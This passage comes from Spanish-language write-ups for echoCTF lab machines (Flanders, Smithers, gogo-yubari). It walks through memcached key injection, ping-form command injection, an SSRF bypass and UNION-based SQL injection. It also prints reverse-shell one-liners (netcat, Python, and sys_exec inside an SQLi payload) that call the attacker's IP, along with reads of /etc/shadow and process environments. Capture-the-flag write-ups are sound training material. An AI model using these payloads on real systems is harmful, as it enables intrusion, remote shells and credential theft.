<h2 id="escalación-de-privilegios-11"><a class="header" href="#escalación-de-privilegios-11">Escalación de privilegios</a></h2>
<h3 id="etsctf--root"><a class="header" href="#etsctf--root">ETSCTF → root</a></h3>
<p>La idea inicial a seguir sería extraer la llave encontrada para intentar acceder al sistema con ella, dado que ningún intento funcionó, se puede tratar de ubicar si existe algún otro medio de acceso a la máquina por el cuál esté restringida a conexiones provenientes únicamente desde local, es decir, de <code>flanders</code> hacia <code>flanders</code>. Para comprobar esto se puede buscar si algún servicio de <code>ssh</code> está ejecutandose y si existe algún puerto que esté a la escucha de nuevas conexiones.</p>
<p><img src="echoCTF/targets/2_basic/Flanders/./images/post_2.png" alt="post_2" /></p>
<p>La salida del comando mapea automáticamente los puertos comúnes para el servicio siendo así que <code>127.0.0.1:ssh</code> sería lo mismo que <code>127.0.0.1:22</code>, verificando de esta manera que se escuchan conexiones <code>ssh</code> localmente.</p>
<p><img src="echoCTF/targets/2_basic/Flanders/./images/post_3.png" alt="post_3" /></p>
<p>En esta comprobación se puede ver que se está ejecutando <code>sshd</code> correspondiente al servidor de <code>ssh</code> en linux.</p>
<p>Se suelen proteger las llaves <code>ssh</code> con passphrases y observando que en la descripción de la máquina se proporciona una passphrase (<code>Okily Dokily</code>) se pudiera concluir que al hacer uso de la llave se pedirá.</p>
<p><img src="echoCTF/targets/2_basic/Flanders/./images/post_4.png" alt="post_4" /></p>
<p>Logrando así satisfactoriamente la escalación de privilegios.</p>
<p><img src="echoCTF/targets/2_basic/Flanders/./images/post_5.png" alt="post_5" /></p>
<h2 id="ubicación-de-banderas"><a class="header" href="#ubicación-de-banderas">Ubicación de banderas</a></h2>
<ol>
<li><code>/etc/passwd</code>.</li>
<li><code>/etc/shadow</code>.</li>
<li>Extrayendo las variables de entorno de los procesos en ejecución con <code>strings /proc/*/environ | grep ETSCTF</code>.</li>
<li><code>/root</code>.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-13"><a class="header" href="#estadísticas-13">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://echoctf.red/target/5">smithers</a></td></tr>
<tr><td>Dificultad</td><td>Beginner</td></tr>
<tr><td>Banderas</td><td>7 (5 other, env, root)</td></tr>
<tr><td>Puntos</td><td>8,100 pts (other/1,500 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, other/1,000 pts, env/900 pts, root/1,500 pts)</td></tr>
<tr><td>Descripción / Pistas</td><td>Like Smithers this server will serve you well only if you manage to enter it's memcached store. The memcache service you just discovered on smithers.echocity-f.com/10.0.160.142:11211 has a hidden flag.</td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-13"><a class="header" href="#reconocimiento-13">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-13"><a class="header" href="#escaneo-de-host-13">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-13"><a class="header" href="#escaneo-completo-de-puertos-13">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">❯ nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:45 CDT
Initiating Connect Scan at 19:45
Scanning 10.0.100.142 [65535 ports]
Discovered open port 11211/tcp on 10.0.100.142
Discovered open port 10888/tcp on 10.0.100.142
Completed Connect Scan at 19:45, 21.90s elapsed (65535 total ports)
Nmap scan report for 10.0.100.142
Host is up, received user-set (0.14s latency).
Scanned at 2021-10-14 19:45:20 CDT for 22s
Not shown: 53830 closed ports, 11703 filtered ports
Reason: 53830 conn-refused and 11703 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE  REASON
10888/tcp open  unknown  syn-ack
11211/tcp open  memcache syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds
</code></pre>
<h3 id="escaneo-específico-13"><a class="header" href="#escaneo-específico-13">Escaneo específico</a></h3>
<pre><code class="language-bash">❯ nmap -sCV -p 11211,10888 -oN nmap/targeted $BOX_TARGET
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:46 CDT
Nmap scan report for 10.0.100.142
Host is up (0.14s latency).

PORT      STATE SERVICE   VERSION
10888/tcp open  http      nginx
|_http-title: Network Tools
11211/tcp open  memcached Memcached 1.5.12 (uptime 36084 seconds)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
</code></pre>
<h1 id="enumeración-25"><a class="header" href="#enumeración-25">Enumeración</a></h1>
<h2 id="servicios-12"><a class="header" href="#servicios-12">Servicios</a></h2>
<h3 id="http---10888"><a class="header" href="#http---10888">http - 10888</a></h3>
<h4 id="manual-9"><a class="header" href="#manual-9">Manual</a></h4>
<p>Al navegar al sitio se visualiza algún tipo de servicio que pone a disposición utilidades de red, pero de acuerdo con el mensaje que se arroja se puede suponer que para tener acceso se requiere estar en algún tipo de lista blanca que se encuentra configurada en el servidor. Tratando de hacer un bypass básico a esta validación se decidió jugar un poco con cabeceras como <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For">X-Forwarded-For</a> entre otras, para ver si la respuesta por parte del servidor cambiaba de algún modo, sin éxito aparente.</p>
<p><img src="echoCTF/targets/2_basic/Smithers/./images/enum_1.png" alt="enum_1" /></p>
<h3 id="memcached---11211"><a class="header" href="#memcached---11211">memcached - 11211</a></h3>
<h4 id="manual-10"><a class="header" href="#manual-10">Manual</a></h4>
<p>Siendo permitida la conexión directa mal socket mediante <code>netcat</code> se permite la obtención de datos existentes en el servidor mediante comandos propios de <code>memcached</code>, datos como versión, estatus, slabs, items, entre otros.</p>
<p><strong>Comandos útiles</strong></p>
<p><em>Después de entablar la conexión</em></p>
<pre><code class="language-bash">version # Obtener versión
stats # Obtener estatus
stats slabs # Obtener slabs
stats items # Obtener items de slabs con información
stats cachedump &lt;numero_de_item&gt; 0 # Obtener nombres de llaves (0 es para no limitar el tamaño del output)
get &lt;nombre_de_item&gt; # Obtener información guardada de item
</code></pre>
<p><em>Referencia: https://book.hacktricks.xyz/pentesting/11211-memcache</em></p>
<p><img src="echoCTF/targets/2_basic/Smithers/./images/enum_2.png" alt="enum_2" /></p>
<p>Recalcando que para la obtención del <code>número de item</code> se puede extraer de la columna señalada del output generado por la obtención de los items.</p>
<h1 id="explotación-13"><a class="header" href="#explotación-13">Explotación</a></h1>
<p>Habiendo encontrado que se puede exfiltrar información mediante la interacción con el servicio de <code>memcached</code> faltaría validar si también se puede configurar información en el servicio.</p>
<h2 id="abuso-de-escritura-de-items-en-memcached"><a class="header" href="#abuso-de-escritura-de-items-en-memcached">Abuso de escritura de items en <code>memcached</code></a></h2>
<h3 id="pasos-previos--preparación-9"><a class="header" href="#pasos-previos--preparación-9">Pasos previos | Preparación</a></h3>
<p>Dentro de la enumeración se encontró que la versión de <code>memcached</code> y la información contenida al navegar al sitio expuesto coincidía por lo que bajo la suposición de que estos dos interactuan entre sí y de no haber encontrado el item <code>REMOTE_ADDR</code> como lo indica el sitio web se puede intentar guardando este item con el valor de la IP correspondiente.</p>
<p><strong>Sintaxis</strong></p>
<pre><code class="language-bash">set key flags exptime bytes
value 
</code></pre>
<p><strong>Uso</strong></p>
<pre><code class="language-bash">set REMOTE_ADDR 0 2592000 4
test
</code></pre>
<p><em>Referencia: https://www.tutorialspoint.com/memcached/memcached_set_data.htm</em></p>
<p>Al tener problemas de interacción directa para configurar los valores se encontraron otras alternativas funcionales.</p>
<h4 id="método-1"><a class="header" href="#método-1">Método 1</a></h4>
<p><strong>Comando</strong></p>
<p><code>echo -e 'set REMOTE_ADDR 0 2592000 4\r\ntest\r' | nc -nv -w 1 10.0.100.142 11211</code></p>
<p><img src="echoCTF/targets/2_basic/Smithers/./images/exploit_1.png" alt="exploit_1" /></p>
<ol>
<li>Ejecución.</li>
<li>Validación de existencia (cuando antes no se desplegaba el item 1).</li>
<li>Obtención de valor de valor.</li>
</ol>
<h4 id="método-2"><a class="header" href="#método-2">Método 2</a></h4>
<p>El paquete <code>libmemcached-tools</code> cuenta con utilidades para interactuar con conexiones de <code>memcached</code>. Haciendo uso de <code>memccp</code> se puede copiar un valor pasando como parámetro el archivo con el valor que se piensa ocupar y haciendo uso de <code>memcat</code> para la visualización de los valores de los items.</p>
<pre><code class="language-bash">sudo apt install libmemcached-tools
echo -n &quot;test2&quot; &gt; REMOTE_ADDR
memccp --servers=10.0.100.142 REMOTE_ADDR
memccat --servers=10.0.100.142 REMOTE_ADDR
</code></pre>
<p><img src="echoCTF/targets/2_basic/Smithers/./images/exploit_2.png" alt="exploit_2" /></p>
<p><em>Referencia: https://www.hackingarticles.in/penetration-testing-on-memcached-server/</em></p>
<h3 id="ejecución-20"><a class="header" href="#ejecución-20">Ejecución</a></h3>
<p>Configurando la variable que concuerda con ambos servicios y añadiendo la asignada por la vpn el output de la página resulta diferente.</p>
<p><img src="echoCTF/targets/2_basic/Smithers/./images/exploit_3.png" alt="exploit_3" /></p>
<p>A partir de este punto se puede observar que se habilita un formulario para realizar un ping a un host, lo que a nivel de código se puede reducir en algo como:</p>
<pre><code class="language-php">$ip = &quot;valor proporcionado por formulario&quot;
system('ping ' . $ip);
</code></pre>
<p>Lo que al final se reduciría en ejecución remota de comandos, ya que en consola podemos usar &quot;separadores&quot; para ejecutar múltiples comandos en una misma instrucción, lo que a nivel de código se ejemplificaría en <code>ping 127.0.0.1; whoami</code>.</p>
<p><img src="echoCTF/targets/2_basic/Smithers/./images/exploit_4.png" alt="exploit_4" /></p>
<p>Al ver el servicio lo ejecuta directamente <code>root</code>, al obtener una reverse shell, no se requiriría proceso de escalación de privilegios.</p>
<p>Al realizar la prueba para obtener una reverse shell con netcat usando <code>;nc -e /bin/bash 10.10.0.26 1234</code> no se ejecutó satisfactoriamente por lo que se optó intentar con diferentes alcances, siendo <code>python3</code> el funcional (<code>;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.0.26&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)'</code>).</p>
<p><img src="echoCTF/targets/2_basic/Smithers/./images/exploit_5.png" alt="exploit_5" /></p>
<h1 id="ubicación-de-banderas-1"><a class="header" href="#ubicación-de-banderas-1">Ubicación de banderas</a></h1>
<ol>
<li>Llave - valor de <code>memcached</code>.</li>
<li><code>/var/lib/nginx/html/network-tools.php</code> x 3.</li>
<li><code>/</code></li>
<li>Extrayendo las variables de entorno de los procesos en ejecución con <code>strings /proc/*/environ | grep ETSCTF</code>.</li>
<li><code>/root</code>.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gogo-yubari"><a class="header" href="#gogo-yubari">Gogo Yubari</a></h1>
<p>Write-up de la máquina gogo-yubari de la plataforma <a href="https://echoCTF.red">echoCTF</a>.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/cover-gogo.jpg" alt="Cover gogo-yubari" /></p>
<h2 id="tabla-de-contenido-7"><a class="header" href="#tabla-de-contenido-7">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#introducci%C3%B3n">Introducción</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#t%C3%A9cnicas-vistas--tags">Técnicas vistas / Tags</a></li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#estad%C3%ADsticas">Estadísticas</a></li>
</ul>
</li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#reconocimiento">Reconocimiento</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#escaneo-de-host">Escaneo de host</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#escaneo-completo-de-puertos">Escaneo completo de puertos</a></li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#escaneo-espec%C3%ADfico">Escaneo específico</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#enumeraci%C3%B3n">Enumeración</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#servicios">Servicios</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#http---8080">http - 8080</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#manual">Manual</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#explotaci%C3%B3n">Explotación</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#ssrf">SSRF</a></li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#sqli">SQLi</a></li>
</ul>
</li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#post-explotaci%C3%B3n">Post Explotación</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#escalaci%C3%B3n-de-privilegios">Escalación de privilegios</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#mysql--root">mysql → root</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#ubicaci%C3%B3n-de-banderas">Ubicación de banderas</a></li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#notas-adicionales">Notas adicionales</a>
<ul>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#eventos-mysql">Eventos <code>mysql</code></a></li>
</ul>
</li>
<li><a href="echoCTF/targets/5_expert/gogo-yubari/index.html#referencias">Referencias</a></li>
</ul>
<h2 id="introducción-4"><a class="header" href="#introducción-4">Introducción</a></h2>
<h3 id="técnicas-vistas--tags-4"><a class="header" href="#técnicas-vistas--tags-4">Técnicas vistas / Tags</a></h3>
<ul>
<li>Server Side Request Forgery (SSRF).</li>
<li>SQL Injection.</li>
</ul>
<h3 id="estadísticas-14"><a class="header" href="#estadísticas-14">Estadísticas</a></h3>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://echoctf.red/target/14">gogo-yubari</a></td></tr>
<tr><td>Dificultad</td><td>Expert</td></tr>
<tr><td>Banderas</td><td>11 (7: other, 2: system, env, root)</td></tr>
<tr><td>Puntos</td><td>6,600: (other: 1,600, system: 2,600, env: 900, root: 1,500)</td></tr>
<tr><td>Descripción/Pistas</td><td>Gogo Yubari the web scrapper, named after the famous assassin, scraps echocity-f.com for validation of usability rules by producing a screenshot of the site.</td></tr>
</tbody></table>
</div>
<h2 id="reconocimiento-14"><a class="header" href="#reconocimiento-14">Reconocimiento</a></h2>
<h3 id="escaneo-de-host-14"><a class="header" href="#escaneo-de-host-14">Escaneo de host</a></h3>
<h4 id="escaneo-completo-de-puertos-14"><a class="header" href="#escaneo-completo-de-puertos-14">Escaneo completo de puertos</a></h4>
<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 23:17 EST
Initiating SYN Stealth Scan at 23:17
Scanning 10.0.200.69 [65535 ports]
Discovered open port 8080/tcp on 10.0.200.69
Completed SYN Stealth Scan at 23:17, 17.74s elapsed (65535 total ports)
Nmap scan report for 10.0.200.69
Host is up (0.15s latency).
Not shown: 61724 closed tcp ports (reset), 3810 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
           Raw packets sent: 87925 (3.869MB) | Rcvd: 66137 (2.645MB)
</code></pre>
<h4 id="escaneo-específico-14"><a class="header" href="#escaneo-específico-14">Escaneo específico</a></h4>
<pre><code class="language-bash">└─$ nmap -sCV -p 8080 -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 23:21 EST
Nmap scan report for 10.0.200.69
Host is up (0.15s latency).

PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy GoGo go v1.11.12
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: GoGo go v1.11.12
|     Date: Thu, 26 Jan 2023 04:21:46 GMT
|     Content-Type: text/html; charset=utf-8
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Gogo Yubari URL Cralwer&lt;/title&gt;
|     &lt;style&gt;
|     main {
|     font-family: monospace, monospace;
|     max-width: 38rem;
|     padding: 2rem;
|     margin: auto;
|     @media only screen and (max-device-width: 736px) {
|     main {
|     padding: 0rem;
|     ::selection {
|     background: #d3869b;
|     body {
|     background: #282828;
|     color: #ebdbb2;
|     background-color: #3c3836;
|     padding: 1em;
|     border: 0;
|     a:active, a:visited {
|     color: #b16286;
|_    background-color: #1d2021;
|_http-title: Gogo Yubari URL Cralwer
|_http-server-header: GoGo go v1.11.12
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=1/25%Time=63D1FFDA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,B67,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20GoGo\x20go\x20v1\.11
SF:\.12\r\nDate:\x20Thu,\x2026\x20Jan\x202023\x2004:21:46\x20GMT\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html
SF:&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Gogo\
SF:x20Yubari\x20URL\x20Cralwer&lt;/title&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;s
SF:tyle&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20main\x20{\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20monospace,\x20monosp
SF:ace;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x2038r
SF:em;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x202rem;\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x20auto;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20@media\x20only\x20screen\x20and\x20\(max-device-width:\x20736
SF:px\)\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20main\x20{\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200rem
SF:;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::s
SF:election\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgrou
SF:nd:\x20#d3869b;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20background:\x20#282828;\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20color:\x20\x20\x20\x20\x20\x20#ebdbb2;\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20pre\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgroun
SF:d-color:\x20#3c3836;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p
SF:adding:\x201em;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border
SF::\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20a,\x20a:active,\x20a:visited\x20{\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#b16286;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#1d2021;\n&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.59 seconds
</code></pre>
<h2 id="enumeración-26"><a class="header" href="#enumeración-26">Enumeración</a></h2>
<h3 id="servicios-13"><a class="header" href="#servicios-13">Servicios</a></h3>
<h4 id="http---8080"><a class="header" href="#http---8080">http - 8080</a></h4>
<h5 id="manual-11"><a class="header" href="#manual-11">Manual</a></h5>
<p>En la página principal se presenta una utilidad para realizar <a href="https://es.wikipedia.org/wiki/Web_scraping">web-scrapping</a> mediante una URL la cuál se permite proporcionar.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/enum_1.png" alt="Página principal" /></p>
<p>A través del código fuente se expone un hostname interno (consola de administrador).</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/enum_2.png" alt="Hostname interno" /></p>
<p>Después de enviar un formulario con la URL que puede ser enviada, se puede identificar que sólo acepta peticiones que puedan ser identificadas como internas dado que se genera una imagen en <code>/public/&lt;ip&gt;.png</code> en caso de que sea procesada correctamente, en caso contrario, la ruta de la imagen será <code>/fullscreenshot.png</code>.</p>
<h2 id="explotación-14"><a class="header" href="#explotación-14">Explotación</a></h2>
<h3 id="ssrf-1"><a class="header" href="#ssrf-1">SSRF</a></h3>
<p>Después de probar con numerosos payloads modificando valores de cabeceras de la petición (<code>Host</code>, <code>X-Forwarder-For</code>, etc.) se identificó que se logra hacer un bypass interno al sitio usando <code>https</code> en vez de <code>http</code> en la URL proveída. Por lo que al usar <code>https://localhost.echocity-f.com/</code> se genera una imagen correctamente con su respuesta.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_1.png" alt="Respuesta válida" /></p>
<p>Tanto con esa respuesta como al enviar nuevas rutas de prueba, se puede identificar que se está añadiendo un <code>/</code> a la ruta que se consulta, por lo que se puede buscar que no se interprete añadiendo un <code>#</code> al final como si se estuviera consultando un fragmento del sitio señalado. Ejemplo, en <code>https://book.hacktricks.xyz/welcome/readme#pentesting-methodology</code>, se está consultando el recurso readme y dentro de él se indica que se busca el fragmento <code>#pentesting-methodology</code> (véase <a href="https://www.w3.org/wiki/HashURI">W3C - Hash URI</a> y <a href="https://www.jenitennison.com/2011/03/06/hash-uris.html">Jeni Tennison - Hash URIs</a>).</p>
<p>Al visualizar que no se interpréta aparentemente, se buscó usar url encoding en el <code>#</code> para ver si resultaba en un cambio <code>https://localhost.echocity-f.com/%23</code>, permitiendo así visualizar la ruta interna y una bandera.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_2.png" alt="Visualización de ruta interna" /></p>
<p>En este punto se intentó consultar ciertas rutas estándares que suelen ocupar en la plataforma, tales como <code>ETSCTF</code> o <code>ETSCTF.html</code>, identificando que con la segunda después de mandar la petición se creaba un elemento en la plataforma principal.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_3.png" alt="Ejecución de template ETSCTF" /></p>
<p>Y en el dashboard se puede visualizar un nuevo elemento.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_4.png" alt="Nuevo elemento" /></p>
<p>En este punto se intentó identificar una vulnerabilidad de tipo SSTI para los templates <code>.ejs</code> dado el output obtenido al enviar la petición a <code>ETSCTF.html</code> sin obtener éxito alguno. Por lo que se buscaron otras rutas disponibles en la plataforma, identificando:</p>
<ul>
<li><code>/add</code>.</li>
<li><code>/edit</code>.</li>
</ul>
<p>En <code>/edit</code> al pasarle el id del elemento se pudieron visualizar sus valores. Ejemplo <code>https://localhost.echocity-f.com/edit?id=2</code>.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_5.png" alt="Contenido de elemento 2" /></p>
<p>Después al probar con <code>'</code> después del id <code>https://localhost.echocity-f.com/edit?id=2'</code> se identificó una excepción de SQL dándo paso a la siguiente fase de explotación.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_6.png" alt="Excepción SQL" /></p>
<h3 id="sqli"><a class="header" href="#sqli">SQLi</a></h3>
<p>Al requerir de una validación visual de inyección dado el escenario se realizo manualmente todo el proceso de inyección, buscando en primera instancia identificar el número de columnas en la tabla, mediante:</p>
<pre><code class="language-text">id=2' UNION SELECT 1,2,3,4,5-- -
</code></pre>
<p>Iterando de 1 a N hasta no obtener errores en la respuesta. Posteriormente, se buscó identificar cuál de las columnas permite desplegar cadenas de carácteres, identificando la segunda y tercera posición con (añadiendo un ordenamiento para ver el contenido en los inputs disponibles):</p>
<pre><code class="language-text">id=2' UNION SELECT 1,'a','a',4,5 ORDER BY url ASC-- -
</code></pre>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_7.png" alt="Identificación de columnas de cadenas de carácteres" /></p>
<p>Podiendo visualizar la información se buscó identificar que usuario de base de datos estaba siendo usado para tratar de asumir con qué permisos se contaba. Usando:</p>
<pre><code class="language-text">id=2' UNION SELECT 1,user(),'a',4,5 ORDER BY url ASC-- -
</code></pre>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_8.png" alt="Usuario de base de datos" /></p>
<p>Al identificar al usuario <code>root</code> se buscó ejecutar directamente una reverse shell con:</p>
<pre><code class="language-text">id=2' UNION SELECT 1,sys_exec('nc -e /bin/bash 10.10.0.50 1234'),'a',4,5-- -
</code></pre>
<p>Obteniendo así, acceso a la máquina.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/exploit_9.png" alt="Acceso a máquina" /></p>
<h2 id="post-explotación-13"><a class="header" href="#post-explotación-13">Post Explotación</a></h2>
<h3 id="escalación-de-privilegios-12"><a class="header" href="#escalación-de-privilegios-12">Escalación de privilegios</a></h3>
<h4 id="mysql--root"><a class="header" href="#mysql--root">mysql → root</a></h4>
<p>Al ejecutar <code>sudo -l</code> se puede visualizar que el usuario no tiene restricción alguna para ejecutar binarios con <code>sudo</code>, por lo que al ejecutar <code>sudo bash</code>, se obtiene acceso como <code>root</code>.</p>
<p><img src="echoCTF/targets/5_expert/gogo-yubari/images/post_1.png" alt="Acceso como root" /></p>
<h2 id="ubicación-de-banderas-2"><a class="header" href="#ubicación-de-banderas-2">Ubicación de banderas</a></h2>
<ol>
<li>(other: 100 pts x2) <code>/app/frontend/forms.html</code> x2.</li>
<li>(other: 100 pts) <code>/app/frontend/forms.go</code>.</li>
<li>(other: 100 pts) <code>/app/frontend/ETSCTF.html</code>.</li>
<li>(other: 400 pts) <code>/app/backend/views/etsctf.ejs</code>.</li>
<li>(other: 500 pts) mysql event (Revisar <a href="echoCTF/targets/5_expert/gogo-yubari/index.html#eventos-mysql">eventos mysql</a>).</li>
<li>(other: 300 pts) scrapper databases (visto desde la plataforma interna o dentro de la base de datos).</li>
<li>(system: 1300 pts) <code>/etc/passwd</code>.</li>
<li>(system: 1300 pts) <code>/etc/shadow</code>.</li>
<li>(env: 900 pts) <code>strings /proc/1/environ | grep ETSCTF_</code>.</li>
<li>(root: 1500 pts) <code>/root</code></li>
</ol>
<h2 id="notas-adicionales-5"><a class="header" href="#notas-adicionales-5">Notas adicionales</a></h2>
<h3 id="eventos-mysql"><a class="header" href="#eventos-mysql">Eventos <code>mysql</code></a></h3>
<p>Después de realizar búsquedas recursivas en los directorios que ocupan la intrusión, encontré la bandera en el archivo que se interpreta como binario <code>/var/lib/mysql/event.MYD</code>. Al realizar el submit de la misma me encontré que el nombre hace alusión a los eventos de MySQL, al no conocerlos decídi buscar información al repecto y la manera de consultarlos correctamente a través del cliente <code>mysql</code>. Encontrando que estos pueden ser configurados a través del <code>Event Scheduler</code> para ejecutar consultas definidas por el usuario para completar una tarea (algo similar a los cron jobs en linux). Permitiendo consultar su nombre y su contenido con:</p>
<pre><code class="language-bash">MariaDB [(none)]&gt; use scrapper;
use scrapper;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [scrapper]&gt; show events\G # Para consultar los eventos configurados.
show events\G
*************************** 1. row ***************************
                  Db: scrapper
                Name: ev_crawl_pending_queue
             Definer: root@localhost
           Time zone: SYSTEM
                Type: RECURRING
          Execute at: NULL
      Interval value: 30
      Interval field: SECOND
              Starts: 2019-11-14 17:32:37
                Ends: NULL
              Status: ENABLED
          Originator: 0
character_set_client: utf8mb4
collation_connection: utf8mb4_general_ci
  Database Collation: utf8mb4_general_ci
1 row in set (0.00 sec)

MariaDB [scrapper]&gt; SHOW CREATE EVENT ev_crawl_pending_queue\G # Para ver el la configuración del evento seleccionado mediante su nombre.
SHOW CREATE EVENT ev_crawl_pending_queue\G
*************************** 1. row ***************************
               Event: ev_crawl_pending_queue
            sql_mode: NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
           time_zone: SYSTEM
